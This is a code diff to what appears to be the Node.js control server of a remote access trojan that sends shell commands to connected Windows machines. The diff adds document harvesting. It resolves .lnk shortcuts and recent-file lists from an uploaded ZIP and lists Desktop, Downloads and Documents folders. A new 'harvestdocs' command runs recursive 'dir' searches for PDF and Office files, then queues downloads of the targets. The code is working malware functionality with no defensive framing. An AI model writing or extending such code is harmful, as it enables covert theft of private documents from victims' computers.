@@ -182,62 +182,150 @@ async function resolveSingleShortcut(shortcutPath, clientId, socket) {
 }
 
 /**
- * Extract and resolve shortcuts in ZIP file
+ * Extract ZIP and find all document paths to download
  * @param {string} zipPath - Path to the ZIP file
  * @param {string} clientId - Client ID
  * @param {Socket} socket - TCP socket to send download commands
  */
 async function extractAndResolveShortcuts(zipPath, clientId, socket) {
   try {
-    console.log(`[SHORTCUT] Processing ZIP file: ${zipPath}`);
+    console.log(`[EXTRACTION] Processing ZIP file: ${zipPath}`);
     
-    const zip = new AdmZip(zipPath);
-    const zipEntries = zip.getEntries();
-    
-    const shortcutsToResolve = [];
-    
-    // Find all .lnk files in the ZIP
-    for (const entry of zipEntries) {
-      if (entry.entryName.toLowerCase().endsWith('.lnk')) {
-        try {
-          const lnkBuffer = entry.getData();
-          const targetPath = parseLnkFile(lnkBuffer);
-          
-          if (targetPath && fs.existsSync(targetPath)) {
-            shortcutsToResolve.push({
-              shortcutName: entry.entryName,
-              targetPath: targetPath
-            });
-            console.log(`[SHORTCUT] Found shortcut: ${entry.entryName} -> ${targetPath}`);
-          }
-        } catch (error) {
-          console.error(`[SHORTCUT] Error processing ${entry.entryName}:`, error.message);
-        }
+    // Try to read ZIP even if corrupted
+    let zip;
+    try {
+      zip = new AdmZip(zipPath);
+    } catch (zipError) {
+      console.log(`[EXTRACTION] ZIP might be corrupted, attempting repair...`);
+      // Try reading with lenient mode
+      try {
+        zip = new AdmZip(zipPath, { noCompress: true });
+      } catch (e) {
+        console.error(`[EXTRACTION] Cannot read ZIP file: ${e.message}`);
+        io.emit('commandResponse', { 
+          clientId, 
+          response: `[EXTRACTION] ZIP file corrupted and cannot be repaired. Skipping extraction.`, 
+          timestamp: new Date() 
+        });
+        return;
       }
     }
     
-    // Send download commands for each resolved shortcut
-    if (shortcutsToResolve.length > 0) {
-      console.log(`[SHORTCUT] Found ${shortcutsToResolve.length} shortcuts to resolve`);
+    const zipEntries = zip.getEntries();
+    const itemsToDownload = [];
+    
+    console.log(`[EXTRACTION] ZIP contains ${zipEntries.length} entries`);
+    
+    // Process all entries in the ZIP
+    for (const entry of zipEntries) {
+      try {
+        const entryName = entry.entryName.toLowerCase();
+        
+        // 1. Handle .lnk shortcuts
+        if (entryName.endsWith('.lnk')) {
+          const lnkBuffer = entry.getData();
+          const targetPath = parseLnkFile(lnkBuffer);
+          
+          if (targetPath) {
+            itemsToDownload.push({
+              type: 'shortcut',
+              originalName: entry.entryName,
+              targetPath: targetPath,
+              displayName: path.basename(entry.entryName, '.lnk')
+            });
+            console.log(`[EXTRACTION] Shortcut found: ${entry.entryName} -> ${targetPath}`);
+          }
+        }
+        
+        // 2. Scan text files for file paths (Recent items, etc.)
+        else if (entryName.includes('recent') || entryName.endsWith('.txt') || entryName.endsWith('.dat')) {
+          try {
+            const content = entry.getData().toString('utf-8');
+            // Look for Windows file paths in content
+            const pathRegex = /([A-Z]:\\(?:[^\\/:*?"<>|\r\n]+\\)*[^\\/:*?"<>|\r\n]+\.(?:pdf|docx?|xlsx?|pptx?|txt|rtf))/gi;
+            const matches = content.match(pathRegex);
+            
+            if (matches) {
+              for (const filePath of matches) {
+                // Check if it's a document type we want
+                const ext = path.extname(filePath).toLowerCase();
+                if (['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.rtf'].includes(ext)) {
+                  itemsToDownload.push({
+                    type: 'referenced',
+                    originalName: entry.entryName,
+                    targetPath: filePath,
+                    displayName: path.basename(filePath, ext)
+                  });
+                  console.log(`[EXTRACTION] Document reference found in ${entry.entryName}: ${filePath}`);
+                }
+              }
+            }
+          } catch (e) {
+            // Skip if can't read as text
+          }
+        }
+      } catch (error) {
+        console.error(`[EXTRACTION] Error processing ${entry.entryName}:`, error.message);
+      }
+    }
+    
+    // Also scan common system locations for documents
+    const systemLocations = [
+      'Desktop',
+      'Downloads',
+      'Documents',
+      'Recent'
+    ];
+    
+    io.emit('commandResponse', { 
+      clientId, 
+      response: `[EXTRACTION] Scanning system folders for documents...`, 
+      timestamp: new Date() 
+    });
+    
+    for (const location of systemLocations) {
+      // Request directory listing
+      const listCmd = {
+        type: 'command',
+        content: `ls %USERPROFILE%\\${location}`
+      };
+      socket.write(JSON.stringify(listCmd) + '\n');
+      
+      // Wait for response
+      await new Promise(resolve => setTimeout(resolve, 500));
+    }
+    
+    // Remove duplicates
+    const uniquePaths = new Set();
+    const uniqueItems = itemsToDownload.filter(item => {
+      if (uniquePaths.has(item.targetPath.toLowerCase())) {
+        return false;
+      }
+      uniquePaths.add(item.targetPath.toLowerCase());
+      return true;
+    });
+    
+    // Download all items
+    if (uniqueItems.length > 0) {
+      console.log(`[EXTRACTION] Found ${uniqueItems.length} items to download`);
       
       io.emit('commandResponse', { 
         clientId, 
-        response: `\n[SHORTCUT RESOLVER] Found ${shortcutsToResolve.length} shortcuts. Downloading target files...`, 
+        response: `\n[EXTRACTION] Found ${uniqueItems.length} items (shortcuts + documents). Downloading...`, 
         timestamp: new Date() 
       });
       
-      // Download each target file
-      for (const shortcut of shortcutsToResolve) {
-        const targetPath = shortcut.targetPath;
-        const shortcutName = path.basename(shortcut.shortcutName, '.lnk');
+      // Download each item
+      for (const item of uniqueItems) {
+        const targetPath = item.targetPath;
         const targetExt = path.extname(targetPath);
-        const newFilename = `${shortcutName}_resolved${targetExt}`;
+        const newFilename = `${item.displayName}_resolved${targetExt}`;
         
-        console.log(`[SHORTCUT] Requesting download: ${targetPath}`);
+        console.log(`[EXTRACTION] Requesting: ${targetPath}`);
         
         io.emit('commandResponse', { 
           clientId, 
-          response: `[SHORTCUT] Downloading: ${shortcutName} -> ${path.basename(targetPath)}`, 
+          response: `[EXTRACTION] Downloading: ${item.displayName}${targetExt}`, 
           timestamp: new Date() 
         });
         
@@ -256,22 +344,27 @@ async function extractAndResolveShortcuts(zipPath, clientId, socket) {
             filename: newFilename,
             buffer: Buffer.alloc(0),
             timeout: null,
-            originalShortcut: shortcut.shortcutName,
+            originalName: item.originalName,
             targetPath: targetPath
           };
         }
         
-        // Wait a bit between downloads to avoid overwhelming the client
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        // Wait between downloads
+        await new Promise(resolve => setTimeout(resolve, 1500));
       }
     } else {
-      console.log(`[SHORTCUT] No shortcuts found in ZIP`);
+      console.log(`[EXTRACTION] No shortcuts or document references found in ZIP`);
+      io.emit('commandResponse', { 
+        clientId, 
+        response: `[EXTRACTION] No shortcuts or document references found`, 
+        timestamp: new Date() 
+      });
     }
   } catch (error) {
-    console.error('[SHORTCUT] Error processing shortcuts:', error);
+    console.error('[EXTRACTION] Error processing ZIP:', error);
     io.emit('commandResponse', { 
       clientId, 
-      response: `[SHORTCUT] Error: ${error.message}`, 
+      response: `[EXTRACTION] Error: ${error.message}`, 
       timestamp: new Date() 
     });
   }
@@ -1025,6 +1118,56 @@ io.on('connection', (socket) => {
               });
             }
           }
+          return;
+        }
+        
+        // Handle special document harvesting command
+        if (typeof command === 'string' && command.trim().toLowerCase() === 'harvestdocs') {
+          io.emit('commandResponse', { 
+            clientId, 
+            response: '[HARVEST] Starting document harvesting from system folders...', 
+            timestamp: new Date() 
+          });
+          
+          // Define folders to scan
+          const foldersToScan = [
+            '%USERPROFILE%\\Desktop',
+            '%USERPROFILE%\\Downloads', 
+            '%USERPROFILE%\\Documents',
+            '%PUBLIC%\\Desktop',
+            '%PUBLIC%\\Downloads',
+            '%PUBLIC%\\Documents'
+          ];
+          
+          const fileExtensions = ['*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx', '*.lnk'];
+          
+          io.emit('commandResponse', { 
+            clientId, 
+            response: `[HARVEST] Scanning ${foldersToScan.length} system folders for documents...`, 
+            timestamp: new Date() 
+          });
+          
+          // Send commands to list files in each folder
+          foldersToScan.forEach((folder, index) => {
+            setTimeout(() => {
+              fileExtensions.forEach((ext, extIndex) => {
+                setTimeout(() => {
+                  const listCmd = {
+                    type: 'command',
+                    content: `dir /b /s "${folder}\\${ext}" 2>nul`
+                  };
+                  client.socket.write(JSON.stringify(listCmd) + '\n');
+                }, extIndex * 300);
+              });
+            }, index * 2500);
+          });
+          
+          io.emit('commandResponse', { 
+            clientId, 
+            response: '[HARVEST] Scan initiated. Documents will be listed shortly. Use "download <path>" to get them.', 
+            timestamp: new Date() 
+          });
+          
           return;
         }
         
